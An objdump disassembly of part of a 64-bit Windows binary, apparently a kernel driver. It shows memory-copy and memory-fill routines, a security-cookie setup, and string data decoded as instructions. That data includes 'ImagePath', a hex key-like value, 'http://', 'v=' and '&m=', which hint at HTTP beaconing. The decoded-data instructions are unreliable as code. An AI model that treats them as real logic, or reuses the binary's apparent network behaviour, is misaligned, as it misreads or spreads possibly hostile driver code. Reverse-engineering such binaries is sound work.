   14000738e:	0f 10 64 11 30       	movups 0x30(%rcx,%rdx,1),%xmm4
   140007393:	0f 2b 41 f0          	movntps %xmm0,-0x10(%rcx)
   140007397:	48 83 c1 40          	add    $0x40,%rcx
   14000739b:	0f 18 44 11 40       	prefetchnta 0x40(%rcx,%rdx,1)
   1400073a0:	49 ff c9             	dec    %r9
   1400073a3:	0f 2b 49 c0          	movntps %xmm1,-0x40(%rcx)
   1400073a7:	0f 2b 51 d0          	movntps %xmm2,-0x30(%rcx)
   1400073ab:	0f 2b 59 e0          	movntps %xmm3,-0x20(%rcx)
   1400073af:	0f 28 c4             	movaps %xmm4,%xmm0
   1400073b2:	75 cc                	jne    0x140007380
   1400073b4:	0f ae f8             	sfence
   1400073b7:	e9 33 ff ff ff       	jmp    0x1400072ef
   1400073bc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400073c0:	49 03 c8             	add    %r8,%rcx
   1400073c3:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   1400073c8:	48 83 e9 10          	sub    $0x10,%rcx
   1400073cc:	49 83 e8 10          	sub    $0x10,%r8
   1400073d0:	f6 c1 0f             	test   $0xf,%cl
   1400073d3:	74 18                	je     0x1400073ed
   1400073d5:	4c 8b d9             	mov    %rcx,%r11
   1400073d8:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   1400073dc:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   1400073e0:	41 0f 11 03          	movups %xmm0,(%r11)
   1400073e4:	0f 28 c1             	movaps %xmm1,%xmm0
   1400073e7:	4c 8b c1             	mov    %rcx,%r8
   1400073ea:	4c 2b c0             	sub    %rax,%r8
   1400073ed:	4d 8b c8             	mov    %r8,%r9
   1400073f0:	49 c1 e9 06          	shr    $0x6,%r9
   1400073f4:	74 39                	je     0x14000742f
   1400073f6:	49 83 e0 3f          	and    $0x3f,%r8
   1400073fa:	eb 04                	jmp    0x140007400
   1400073fc:	0f 1f 40 00          	nopl   0x0(%rax)
   140007400:	0f 10 4c 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm1
   140007405:	0f 10 54 11 e0       	movups -0x20(%rcx,%rdx,1),%xmm2
   14000740a:	0f 10 5c 11 d0       	movups -0x30(%rcx,%rdx,1),%xmm3
   14000740f:	0f 10 64 11 c0       	movups -0x40(%rcx,%rdx,1),%xmm4
   140007414:	0f 29 01             	movaps %xmm0,(%rcx)
   140007417:	48 83 e9 40          	sub    $0x40,%rcx
   14000741b:	49 ff c9             	dec    %r9
   14000741e:	0f 29 49 30          	movaps %xmm1,0x30(%rcx)
   140007422:	0f 29 51 20          	movaps %xmm2,0x20(%rcx)
   140007426:	0f 29 59 10          	movaps %xmm3,0x10(%rcx)
   14000742a:	0f 28 c4             	movaps %xmm4,%xmm0
   14000742d:	75 d1                	jne    0x140007400
   14000742f:	4d 8b c8             	mov    %r8,%r9
   140007432:	49 c1 e9 04          	shr    $0x4,%r9
   140007436:	74 19                	je     0x140007451
   140007438:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000743f:	00 
   140007440:	0f 29 01             	movaps %xmm0,(%rcx)
   140007443:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   140007448:	48 83 e9 10          	sub    $0x10,%rcx
   14000744c:	49 ff c9             	dec    %r9
   14000744f:	75 ef                	jne    0x140007440
   140007451:	49 83 e0 0f          	and    $0xf,%r8
   140007455:	74 0f                	je     0x140007466
   140007457:	4c 8b d9             	mov    %rcx,%r11
   14000745a:	4d 2b d8             	sub    %r8,%r11
   14000745d:	41 0f 10 0c 13       	movups (%r11,%rdx,1),%xmm1
   140007462:	41 0f 11 0b          	movups %xmm1,(%r11)
   140007466:	0f 29 01             	movaps %xmm0,(%rcx)
   140007469:	c3                   	ret
   14000746a:	cc                   	int3
   14000746b:	cc                   	int3
   14000746c:	cc                   	int3
   14000746d:	cc                   	int3
   14000746e:	cc                   	int3
   14000746f:	cc                   	int3
   140007470:	cc                   	int3
   140007471:	cc                   	int3
   140007472:	cc                   	int3
   140007473:	cc                   	int3
   140007474:	cc                   	int3
   140007475:	cc                   	int3
   140007476:	cc                   	int3
   140007477:	cc                   	int3
   140007478:	cc                   	int3
   140007479:	cc                   	int3
   14000747a:	cc                   	int3
   14000747b:	cc                   	int3
   14000747c:	cc                   	int3
   14000747d:	cc                   	int3
   14000747e:	cc                   	int3
   14000747f:	cc                   	int3
   140007480:	48 8b c1             	mov    %rcx,%rax
   140007483:	49 83 f8 08          	cmp    $0x8,%r8
   140007487:	72 47                	jb     0x1400074d0
   140007489:	0f b6 d2             	movzbl %dl,%edx
   14000748c:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   140007493:	01 01 01 
   140007496:	49 0f af d1          	imul   %r9,%rdx
   14000749a:	49 83 f8 4f          	cmp    $0x4f,%r8
   14000749e:	73 50                	jae    0x1400074f0
   1400074a0:	4d 8b c8             	mov    %r8,%r9
   1400074a3:	49 83 e1 f8          	and    $0xfffffffffffffff8,%r9
   1400074a7:	49 03 c9             	add    %r9,%rcx
   1400074aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400074b0:	4a 89 54 08 f8       	mov    %rdx,-0x8(%rax,%r9,1)
   1400074b5:	49 83 e9 08          	sub    $0x8,%r9
   1400074b9:	75 f5                	jne    0x1400074b0
   1400074bb:	49 83 e0 07          	and    $0x7,%r8
   1400074bf:	74 05                	je     0x1400074c6
   1400074c1:	4a 89 54 01 f8       	mov    %rdx,-0x8(%rcx,%r8,1)
   1400074c6:	c3                   	ret
   1400074c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400074ce:	00 00 
   1400074d0:	49 83 e0 07          	and    $0x7,%r8
   1400074d4:	74 0a                	je     0x1400074e0
   1400074d6:	42 88 54 00 ff       	mov    %dl,-0x1(%rax,%r8,1)
   1400074db:	49 ff c8             	dec    %r8
   1400074de:	75 f6                	jne    0x1400074d6
   1400074e0:	c3                   	ret
   1400074e1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400074e8:	0f 1f 84 00 00 00 00 
   1400074ef:	00 
   1400074f0:	66 48 0f 6e c2       	movq   %rdx,%xmm0
   1400074f5:	0f 16 c0             	movlhps %xmm0,%xmm0
   1400074f8:	0f 11 01             	movups %xmm0,(%rcx)
   1400074fb:	4c 03 c1             	add    %rcx,%r8
   1400074fe:	48 83 c1 10          	add    $0x10,%rcx
   140007502:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   140007506:	4c 2b c1             	sub    %rcx,%r8
   140007509:	4d 8b c8             	mov    %r8,%r9
   14000750c:	49 c1 e9 07          	shr    $0x7,%r9
   140007510:	74 2f                	je     0x140007541
   140007512:	0f 29 01             	movaps %xmm0,(%rcx)
   140007515:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   140007519:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   140007520:	0f 29 41 a0          	movaps %xmm0,-0x60(%rcx)
   140007524:	0f 29 41 b0          	movaps %xmm0,-0x50(%rcx)
   140007528:	49 ff c9             	dec    %r9
   14000752b:	0f 29 41 c0          	movaps %xmm0,-0x40(%rcx)
   14000752f:	0f 29 41 d0          	movaps %xmm0,-0x30(%rcx)
   140007533:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   140007537:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   14000753b:	75 d5                	jne    0x140007512
   14000753d:	49 83 e0 7f          	and    $0x7f,%r8
   140007541:	4d 8b c8             	mov    %r8,%r9
   140007544:	49 c1 e9 04          	shr    $0x4,%r9
   140007548:	74 12                	je     0x14000755c
   14000754a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140007550:	0f 11 01             	movups %xmm0,(%rcx)
   140007553:	48 83 c1 10          	add    $0x10,%rcx
   140007557:	49 ff c9             	dec    %r9
   14000755a:	75 f4                	jne    0x140007550
   14000755c:	49 83 e0 0f          	and    $0xf,%r8
   140007560:	74 06                	je     0x140007568
   140007562:	42 0f 11 44 01 f0    	movups %xmm0,-0x10(%rcx,%r8,1)
   140007568:	c3                   	ret
   140007569:	cc                   	int3
   14000756a:	cc                   	int3
   14000756b:	cc                   	int3
   14000756c:	cc                   	int3
   14000756d:	cc                   	int3
   14000756e:	cc                   	int3
   14000756f:	cc                   	int3
   140007570:	49 00 6d 00          	rex.WB add %bpl,0x0(%r13)
   140007574:	61                   	(bad)
   140007575:	00 67 00             	add    %ah,0x0(%rdi)
   140007578:	65 00 50 00          	add    %dl,%gs:0x0(%rax)
   14000757c:	61                   	(bad)
   14000757d:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
   140007581:	00 00                	add    %al,(%rax)
   140007583:	00 cc                	add    %cl,%ah
   140007585:	cc                   	int3
   140007586:	cc                   	int3
   140007587:	cc                   	int3
   140007588:	cc                   	int3
   140007589:	cc                   	int3
   14000758a:	cc                   	int3
   14000758b:	cc                   	int3
   14000758c:	cc                   	int3
   14000758d:	cc                   	int3
   14000758e:	cc                   	int3
   14000758f:	cc                   	int3
   140007590:	31 32                	xor    %esi,(%rdx)
   140007592:	31 33                	xor    %esi,(%rbx)
   140007594:	61                   	(bad)
   140007595:	38 61 35             	cmp    %ah,0x35(%rcx)
   140007598:	34 34                	xor    $0x34,%al
   14000759a:	31 65 39             	xor    %esp,0x39(%rbp)
   14000759d:	62 66 33 66 65       	(bad)
   1400075a2:	31 32                	xor    %esi,(%rdx)
   1400075a4:	31 36                	xor    %esi,(%rsi)
   1400075a6:	31 31                	xor    %esi,(%rcx)
   1400075a8:	30 63 64             	xor    %ah,0x64(%rbx)
   1400075ab:	65 64 36 35 36 00 cc 	gs fs ss xor $0xcccc0036,%eax
   1400075b2:	cc 
   1400075b3:	cc                   	int3
   1400075b4:	cc                   	int3
   1400075b5:	cc                   	int3
   1400075b6:	cc                   	int3
   1400075b7:	cc                   	int3
   1400075b8:	cc                   	int3
   1400075b9:	cc                   	int3
   1400075ba:	cc                   	int3
   1400075bb:	cc                   	int3
   1400075bc:	cc                   	int3
   1400075bd:	cc                   	int3
   1400075be:	cc                   	int3
   1400075bf:	cc                   	int3
   1400075c0:	25 30 32 78 25       	and    $0x25783230,%eax
   1400075c5:	30 32                	xor    %dh,(%rdx)
   1400075c7:	78 25                	js     0x1400075ee
   1400075c9:	30 32                	xor    %dh,(%rdx)
   1400075cb:	78 25                	js     0x1400075f2
   1400075cd:	30 32                	xor    %dh,(%rdx)
   1400075cf:	78 25                	js     0x1400075f6
   1400075d1:	30 32                	xor    %dh,(%rdx)
   1400075d3:	78 25                	js     0x1400075fa
   1400075d5:	30 32                	xor    %dh,(%rdx)
   1400075d7:	78 25                	js     0x1400075fe
   1400075d9:	30 32                	xor    %dh,(%rdx)
   1400075db:	78 25                	js     0x140007602
   1400075dd:	30 32                	xor    %dh,(%rdx)
   1400075df:	78 25                	js     0x140007606
   1400075e1:	30 32                	xor    %dh,(%rdx)
   1400075e3:	78 25                	js     0x14000760a
   1400075e5:	30 32                	xor    %dh,(%rdx)
   1400075e7:	78 25                	js     0x14000760e
   1400075e9:	30 32                	xor    %dh,(%rdx)
   1400075eb:	78 25                	js     0x140007612
   1400075ed:	30 32                	xor    %dh,(%rdx)
   1400075ef:	78 25                	js     0x140007616
   1400075f1:	30 32                	xor    %dh,(%rdx)
   1400075f3:	78 25                	js     0x14000761a
   1400075f5:	30 32                	xor    %dh,(%rdx)
   1400075f7:	78 25                	js     0x14000761e
   1400075f9:	30 32                	xor    %dh,(%rdx)
   1400075fb:	78 25                	js     0x140007622
   1400075fd:	30 32                	xor    %dh,(%rdx)
   1400075ff:	78 00                	js     0x140007601
   140007601:	cc                   	int3
   140007602:	cc                   	int3
   140007603:	cc                   	int3
   140007604:	cc                   	int3
   140007605:	cc                   	int3
   140007606:	cc                   	int3
   140007607:	cc                   	int3
   140007608:	cc                   	int3
   140007609:	cc                   	int3
   14000760a:	cc                   	int3
   14000760b:	cc                   	int3
   14000760c:	cc                   	int3
   14000760d:	cc                   	int3
   14000760e:	cc                   	int3
   14000760f:	cc                   	int3
   140007610:	33 00                	xor    (%rax),%eax
   140007612:	32 00                	xor    (%rax),%al
   140007614:	30 00                	xor    %al,(%rax)
   140007616:	30 00                	xor    %al,(%rax)
   140007618:	30 00                	xor    %al,(%rax)
   14000761a:	30 00                	xor    %al,(%rax)
   14000761c:	00 00                	add    %al,(%rax)
   14000761e:	cc                   	int3
   14000761f:	cc                   	int3
   140007620:	25 73 63 3d 25       	and    $0x253d6373,%eax
   140007625:	73 00                	jae    0x140007627
   140007627:	cc                   	int3
   140007628:	cc                   	int3
   140007629:	cc                   	int3
   14000762a:	cc                   	int3
   14000762b:	cc                   	int3
   14000762c:	cc                   	int3
   14000762d:	cc                   	int3
   14000762e:	cc                   	int3
   14000762f:	cc                   	int3
   140007630:	6f                   	outsl  (%rsi),(%dx)
   140007631:	6b 00 cc             	imul   $0xffffffcc,(%rax),%eax
   140007634:	cc                   	int3
   140007635:	cc                   	int3
   140007636:	cc                   	int3
   140007637:	cc                   	int3
   140007638:	cc                   	int3
   140007639:	cc                   	int3
   14000763a:	cc                   	int3
   14000763b:	cc                   	int3
   14000763c:	cc                   	int3
   14000763d:	cc                   	int3
   14000763e:	cc                   	int3
   14000763f:	cc                   	int3
   140007640:	25 30 38 58 25       	and    $0x25583830,%eax
   140007645:	30 38                	xor    %bh,(%rax)
   140007647:	58                   	pop    %rax
   140007648:	00 cc                	add    %cl,%ah
   14000764a:	cc                   	int3
   14000764b:	cc                   	int3
   14000764c:	cc                   	int3
   14000764d:	cc                   	int3
   14000764e:	cc                   	int3
   14000764f:	cc                   	int3
   140007650:	5b                   	pop    %rbx
   140007651:	00 cc                	add    %cl,%ah
   140007653:	cc                   	int3
   140007654:	cc                   	int3
   140007655:	cc                   	int3
   140007656:	cc                   	int3
   140007657:	cc                   	int3
   140007658:	cc                   	int3
   140007659:	cc                   	int3
   14000765a:	cc                   	int3
   14000765b:	cc                   	int3
   14000765c:	cc                   	int3
   14000765d:	cc                   	int3
   14000765e:	cc                   	int3
   14000765f:	cc                   	int3
   140007660:	5d                   	pop    %rbp
   140007661:	00 cc                	add    %cl,%ah
   140007663:	cc                   	int3
   140007664:	cc                   	int3
   140007665:	cc                   	int3
   140007666:	cc                   	int3
   140007667:	cc                   	int3
   140007668:	cc                   	int3
   140007669:	cc                   	int3
   14000766a:	cc                   	int3
   14000766b:	cc                   	int3
   14000766c:	cc                   	int3
   14000766d:	cc                   	int3
   14000766e:	cc                   	int3
   14000766f:	cc                   	int3
   140007670:	7b 00                	jnp    0x140007672
   140007672:	cc                   	int3
   140007673:	cc                   	int3
   140007674:	cc                   	int3
   140007675:	cc                   	int3
   140007676:	cc                   	int3
   140007677:	cc                   	int3
   140007678:	cc                   	int3
   140007679:	cc                   	int3
   14000767a:	cc                   	int3
   14000767b:	cc                   	int3
   14000767c:	cc                   	int3
   14000767d:	cc                   	int3
   14000767e:	cc                   	int3
   14000767f:	cc                   	int3
   140007680:	42 00 6c 00 6f       	add    %bpl,0x6f(%rax,%r8,1)
   140007685:	00 62 00             	add    %ah,0x0(%rdx)
   140007688:	00 00                	add    %al,(%rax)
   14000768a:	cc                   	int3
   14000768b:	cc                   	int3
   14000768c:	cc                   	int3
   14000768d:	cc                   	int3
   14000768e:	cc                   	int3
   14000768f:	cc                   	int3
   140007690:	76 3d                	jbe    0x1400076cf
   140007692:	00 cc                	add    %cl,%ah
   140007694:	cc                   	int3
   140007695:	cc                   	int3
   140007696:	cc                   	int3
   140007697:	cc                   	int3
   140007698:	cc                   	int3
   140007699:	cc                   	int3
   14000769a:	cc                   	int3
   14000769b:	cc                   	int3
   14000769c:	cc                   	int3
   14000769d:	cc                   	int3
   14000769e:	cc                   	int3
   14000769f:	cc                   	int3
   1400076a0:	26 6d                	es insl (%dx),(%rdi)
   1400076a2:	3d 00 cc cc cc       	cmp    $0xcccccc00,%eax
   1400076a7:	cc                   	int3
   1400076a8:	cc                   	int3
   1400076a9:	cc                   	int3
   1400076aa:	cc                   	int3
   1400076ab:	cc                   	int3
   1400076ac:	cc                   	int3
   1400076ad:	cc                   	int3
   1400076ae:	cc                   	int3
   1400076af:	cc                   	int3
   1400076b0:	68 74 74 70 3a       	push   $0x3a707474
   1400076b5:	2f                   	(bad)
   1400076b6:	2f                   	(bad)
   1400076b7:	00 cc                	add    %cl,%ah
   1400076b9:	cc                   	int3
   1400076ba:	cc                   	int3
   1400076bb:	cc                   	int3
   1400076bc:	cc                   	int3
   1400076bd:	cc                   	int3
   1400076be:	cc                   	int3
   1400076bf:	cc                   	int3
   1400076c0:	72 00                	jb     0x1400076c2
   1400076c2:	34 00                	xor    $0x0,%al
   1400076c4:	00 00                	add    %al,(%rax)
   1400076c6:	cc                   	int3
   1400076c7:	cc                   	int3
   1400076c8:	cc                   	int3
   1400076c9:	cc                   	int3
   1400076ca:	cc                   	int3
   1400076cb:	cc                   	int3
   1400076cc:	cc                   	int3
   1400076cd:	cc                   	int3
   1400076ce:	cc                   	int3
   1400076cf:	cc                   	int3
   1400076d0:	69 00 34 00 00 00    	imul   $0x34,(%rax),%eax
   1400076d6:	cc                   	int3
   1400076d7:	cc                   	int3
   1400076d8:	cc                   	int3
   1400076d9:	cc                   	int3
   1400076da:	cc                   	int3
   1400076db:	cc                   	int3
   1400076dc:	cc                   	int3
   1400076dd:	cc                   	int3
   1400076de:	cc                   	int3
   1400076df:	cc                   	int3
   1400076e0:	72 00                	jb     0x1400076e2
   1400076e2:	73 00                	jae    0x1400076e4
   1400076e4:	00 00                	add    %al,(%rax)
   1400076e6:	cc                   	int3
   1400076e7:	cc                   	int3
   1400076e8:	cc                   	int3
   1400076e9:	cc                   	int3
   1400076ea:	cc                   	int3
   1400076eb:	cc                   	int3
   1400076ec:	cc                   	int3
   1400076ed:	cc                   	int3
   1400076ee:	cc                   	int3
   1400076ef:	cc                   	int3
   1400076f0:	72 00                	jb     0x1400076f2
   1400076f2:	66 00 76 00          	data16 add %dh,0x0(%rsi)
   1400076f6:	34 00                	xor    $0x0,%al
   1400076f8:	00 00                	add    %al,(%rax)
   1400076fa:	cc                   	int3
   1400076fb:	cc                   	int3
   1400076fc:	cc                   	int3
   1400076fd:	cc                   	int3
   1400076fe:	cc                   	int3
   1400076ff:	cc                   	int3
   140007700:	2f                   	(bad)
   140007701:	2f                   	(bad)
   140007702:	00 cc                	add    %cl,%ah
   140007704:	cc                   	int3
   140007705:	cc                   	int3
   140007706:	cc                   	int3
   140007707:	cc                   	int3
   140007708:	cc                   	int3
   140007709:	cc                   	int3
   14000770a:	cc                   	int3
   14000770b:	cc                   	int3
   14000770c:	cc                   	int3
   14000770d:	cc                   	int3
   14000770e:	cc                   	int3
   14000770f:	cc                   	int3
   140007710:	38 30                	cmp    %dh,(%rax)
   140007712:	00 cc                	add    %cl,%ah
   140007714:	cc                   	int3
   140007715:	cc                   	int3
   140007716:	cc                   	int3
   140007717:	cc                   	int3
   140007718:	cc                   	int3
   140007719:	cc                   	int3
   14000771a:	cc                   	int3
   14000771b:	cc                   	int3
   14000771c:	cc                   	int3
   14000771d:	cc                   	int3
   14000771e:	cc                   	int3
   14000771f:	cc                   	int3
   140007720:	2f                   	(bad)
	...

Disassembly of section INIT:

0000000140016000 <INIT>:
   140016000:	48 8b 05 a9 57 ff ff 	mov    -0xa857(%rip),%rax        # 0x14000b7b0
   140016007:	45 33 c9             	xor    %r9d,%r9d
   14001600a:	49 b8 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%r8
   140016011:	2b 00 00 
   140016014:	48 85 c0             	test   %rax,%rax
   140016017:	74 05                	je     0x14001601e
   140016019:	49 3b c0             	cmp    %r8,%rax
   14001601c:	75 38                	jne    0x140016056
   14001601e:	0f 31                	rdtsc
   140016020:	48 c1 e2 20          	shl    $0x20,%rdx
   140016024:	48 8d 0d 85 57 ff ff 	lea    -0xa87b(%rip),%rcx        # 0x14000b7b0
   14001602b:	48 0b c2             	or     %rdx,%rax
   14001602e:	48 33 c1             	xor    %rcx,%rax
   140016031:	48 89 05 78 57 ff ff 	mov    %rax,-0xa888(%rip)        # 0x14000b7b0
   140016038:	66 44 89 0d 76 57 ff 	mov    %r9w,-0xa88a(%rip)        # 0x14000b7b6
   14001603f:	ff 
   140016040:	48 8b 05 69 57 ff ff 	mov    -0xa897(%rip),%rax        # 0x14000b7b0
   140016047:	48 85 c0             	test   %rax,%rax
   14001604a:	75 0a                	jne    0x140016056
   14001604c:	49 8b c0             	mov    %r8,%rax
   14001604f:	48 89 05 5a 57 ff ff 	mov    %rax,-0xa8a6(%rip)        # 0x14000b7b0
   140016056:	48 f7 d0             	not    %rax
   140016059:	48 89 05 58 57 ff ff 	mov    %rax,-0xa8a8(%rip)        # 0x14000b7b8
   140016060:	c3                   	ret
   140016061:	cc                   	int3
   140016062:	cc                   	int3
   140016063:	cc                   	int3
   140016064:	18 61 01             	sbb    %ah,0x1(%rcx)
	...
   14001606f:	00 dc                	add    %bl,%ah
   140016071:	65 01 00             	add    %eax,%gs:(%rax)
   140016074:	50                   	push   %rax
   140016075:	80 00 00             	addb   $0x0,(%rax)
   140016078:	a8 61                	test   $0x61,%al
   14001607a:	01 00                	add    %eax,(%rax)
	...
   140016084:	ca 6b 01             	lret   $0x16b
   140016087:	00 e0                	add    %ah,%al
   140016089:	80 00 00             	addb   $0x0,(%rax)
   14001608c:	c8 60 01 00          	enter  $0x160,$0x0
	...
   140016098:	26 6c                	es insb (%dx),(%rdi)
   14001609a:	01 00                	add    %eax,(%rax)
   14001609c:	00 80 00 00 f0 60    	add    %al,0x60f00000(%rax)
   1400160a2:	01 00                	add    %eax,(%rax)
	...
   1400160ac:	ac                   	lods   (%rsi),%al
   1400160ad:	6c                   	insb   (%dx),(%rdi)
   1400160ae:	01 00                	add    %eax,(%rax)
   1400160b0:	28 80 00 00 00 00    	sub    %al,0x0(%rax)
	...
   1400160c6:	00 00                	add    %al,(%rax)
   1400160c8:	e6 6b                	out    %al,$0x6b
   1400160ca:	01 00                	add    %eax,(%rax)
   1400160cc:	00 00                	add    %al,(%rax)
   1400160ce:	00 00                	add    %al,(%rax)
   1400160d0:	fe                   	(bad)
   1400160d1:	6b 01 00             	imul   $0x0,(%rcx),%eax
   1400160d4:	00 00                	add    %al,(%rax)
   1400160d6:	00 00                	add    %al,(%rax)
   1400160d8:	16                   	(bad)
   1400160d9:	6c                   	insb   (%dx),(%rdi)
   1400160da:	01 00                	add    %eax,(%rax)
   1400160dc:	00 00                	add    %al,(%rax)
   1400160de:	00 00                	add    %al,(%rax)
   1400160e0:	d8 6b 01             	fsubrs 0x1(%rbx)
	...
   1400160ef:	00 6c 6c 01          	add    %ch,0x1(%rsp,%rbp,2)
   1400160f3:	00 00                	add    %al,(%rax)
   1400160f5:	00 00                	add    %al,(%rax)
   1400160f7:	00 7e 6c             	add    %bh,0x6c(%rsi)
   1400160fa:	01 00                	add    %eax,(%rax)
   1400160fc:	00 00                	add    %al,(%rax)
   1400160fe:	00 00                	add    %al,(%rax)
   140016100:	94                   	xchg   %eax,%esp
   140016101:	6c                   	insb   (%dx),(%rdi)
   140016102:	01 00                	add    %eax,(%rax)
   140016104:	00 00                	add    %al,(%rax)
   140016106:	00 00                	add    %al,(%rax)
   140016108:	58                   	pop    %rax
   140016109:	6c                   	insb   (%dx),(%rdi)
   14001610a:	01 00                	add    %eax,(%rax)
	...
   140016118:	18 65 01             	sbb    %ah,0x1(%rbp)
   14001611b:	00 00                	add    %al,(%rax)
   14001611d:	00 00                	add    %al,(%rax)
   14001611f:	00 2a                	add    %ch,(%rdx)
   140016121:	65 01 00             	add    %eax,%gs:(%rax)
   140016124:	00 00                	add    %al,(%rax)
   140016126:	00 00                	add    %al,(%rax)
   140016128:	42                   	rex.X
   140016129:	65 01 00             	add    %eax,%gs:(%rax)
   14001612c:	00 00                	add    %al,(%rax)
   14001612e:	00 00                	add    %al,(%rax)
   140016130:	06                   	(bad)
   140016131:	65 01 00             	add    %eax,%gs:(%rax)
   140016134:	00 00                	add    %al,(%rax)
   140016136:	00 00                	add    %al,(%rax)
   140016138:	7e 65                	jle    0x14001619f
   14001613a:	01 00                	add    %eax,(%rax)
   14001613c:	00 00                	add    %al,(%rax)
   14001613e:	00 00                	add    %al,(%rax)
   140016140:	96                   	xchg   %eax,%esi
   140016141:	65 01 00             	add    %eax,%gs:(%rax)
   140016144:	00 00                	add    %al,(%rax)
   140016146:	00 00                	add    %al,(%rax)
   140016148:	be 65 01 00 00       	mov    $0x165,%esi
   14001614d:	00 00                	add    %al,(%rax)
   14001614f:	00 ea                	add    %ch,%dl
   140016151:	64 01 00             	add    %eax,%fs:(%rax)
   140016154:	00 00                	add    %al,(%rax)
   140016156:	00 00                	add    %al,(%rax)
   140016158:	d6                   	udb
   140016159:	64 01 00             	add    %eax,%fs:(%rax)
   14001615c:	00 00                	add    %al,(%rax)
   14001615e:	00 00                	add    %al,(%rax)
   140016160:	be 64 01 00 00       	mov    $0x164,%esi
   140016165:	00 00                	add    %al,(%rax)
   140016167:	00 a4 64 01 00 00 00 	add    %ah,0x1(%rsp,%riz,2)
   14001616e:	00 00                	add    %al,(%rax)
   140016170:	8c 64 01 00          	mov    %fs,0x0(%rcx,%rax,1)
   140016174:	00 00                	add    %al,(%rax)
   140016176:	00 00                	add    %al,(%rax)
   140016178:	78 64                	js     0x1400161de
   14001617a:	01 00                	add    %eax,(%rax)
   14001617c:	00 00                	add    %al,(%rax)
   14001617e:	00 00                	add    %al,(%rax)
   140016180:	66 64 01 00          	add    %ax,%fs:(%rax)
   140016184:	00 00                	add    %al,(%rax)
   140016186:	00 00                	add    %al,(%rax)
   140016188:	48                   	rex.W
   140016189:	64 01 00             	add    %eax,%fs:(%rax)
   14001618c:	00 00                	add    %al,(%rax)
   14001618e:	00 00                	add    %al,(%rax)
   140016190:	60                   	(bad)
   140016191:	65 01 00             	add    %eax,%gs:(%rax)
   140016194:	00 00                	add    %al,(%rax)
   140016196:	00 00                	add    %al,(%rax)
   140016198:	30 64 01 00          	xor    %ah,0x0(%rcx,%rax,1)
	...
   1400161a8:	aa                   	stos   %al,(%rdi)
   1400161a9:	66 01 00             	add    %ax,(%rax)
   1400161ac:	00 00                	add    %al,(%rax)
   1400161ae:	00 00                	add    %al,(%rax)
   1400161b0:	ba 66 01 00 00       	mov    $0x166,%edx
   1400161b5:	00 00                	add    %al,(%rax)
   1400161b7:	00 c6                	add    %al,%dh
   1400161b9:	66 01 00             	add    %ax,(%rax)
   1400161bc:	00 00                	add    %al,(%rax)
   1400161be:	00 00                	add    %al,(%rax)
   1400161c0:	e2 66                	loop   0x140016228
   1400161c2:	01 00                	add    %eax,(%rax)
   1400161c4:	00 00                	add    %al,(%rax)
   1400161c6:	00 00                	add    %al,(%rax)
   1400161c8:	fe                   	(bad)
   1400161c9:	66 01 00             	add    %ax,(%rax)
   1400161cc:	00 00                	add    %al,(%rax)
   1400161ce:	00 00                	add    %al,(%rax)
   1400161d0:	16                   	(bad)
   1400161d1:	67 01 00             	add    %eax,(%eax)
   1400161d4:	00 00                	add    %al,(%rax)
   1400161d6:	00 00                	add    %al,(%rax)
   1400161d8:	30 67 01             	xor    %ah,0x1(%rdi)
   1400161db:	00 00                	add    %al,(%rax)
   1400161dd:	00 00                	add    %al,(%rax)
   1400161df:	00 48 67             	add    %cl,0x67(%rax)
   1400161e2:	01 00                	add    %eax,(%rax)
   1400161e4:	00 00                	add    %al,(%rax)
   1400161e6:	00 00                	add    %al,(%rax)
   1400161e8:	56                   	push   %rsi
   1400161e9:	67 01 00             	add    %eax,(%eax)
   1400161ec:	00 00                	add    %al,(%rax)
   1400161ee:	00 00                	add    %al,(%rax)
   1400161f0:	64 67 01 00          	add    %eax,%fs:(%eax)
   1400161f4:	00 00                	add    %al,(%rax)
   1400161f6:	00 00                	add    %al,(%rax)
   1400161f8:	6e                   	outsb  (%rsi),(%dx)
   1400161f9:	67 01 00             	add    %eax,(%eax)
   1400161fc:	00 00                	add    %al,(%rax)
   1400161fe:	00 00                	add    %al,(%rax)
   140016200:	82                   	(bad)
   140016201:	67 01 00             	add    %eax,(%eax)
   140016204:	00 00                	add    %al,(%rax)
   140016206:	00 00                	add    %al,(%rax)
   140016208:	9a                   	(bad)
   140016209:	67 01 00             	add    %eax,(%eax)
   14001620c:	00 00                	add    %al,(%rax)
   14001620e:	00 00                	add    %al,(%rax)
   140016210:	b2 67                	mov    $0x67,%dl
   140016212:	01 00                	add    %eax,(%rax)
   140016214:	00 00                	add    %al,(%rax)
   140016216:	00 00                	add    %al,(%rax)
   140016218:	cc                   	int3
   140016219:	67 01 00             	add    %eax,(%eax)
   14001621c:	00 00                	add    %al,(%rax)
   14001621e:	00 00                	add    %al,(%rax)
   140016220:	e6 67                	out    %al,$0x67
   140016222:	01 00                	add    %eax,(%rax)
   140016224:	00 00                	add    %al,(%rax)
   140016226:	00 00                	add    %al,(%rax)
   140016228:	f0 67 01 00          	lock add %eax,(%eax)
   14001622c:	00 00                	add    %al,(%rax)
   14001622e:	00 00                	add    %al,(%rax)
   140016230:	08 68 01             	or     %ch,0x1(%rax)
   140016233:	00 00                	add    %al,(%rax)
   140016235:	00 00                	add    %al,(%rax)
   140016237:	00 20                	add    %ah,(%rax)
   140016239:	68 01 00 00 00       	push   $0x1
   14001623e:	00 00                	add    %al,(%rax)
   140016240:	3c 68                	cmp    $0x68,%al
   140016242:	01 00                	add    %eax,(%rax)
   140016244:	00 00                	add    %al,(%rax)
   140016246:	00 00                	add    %al,(%rax)
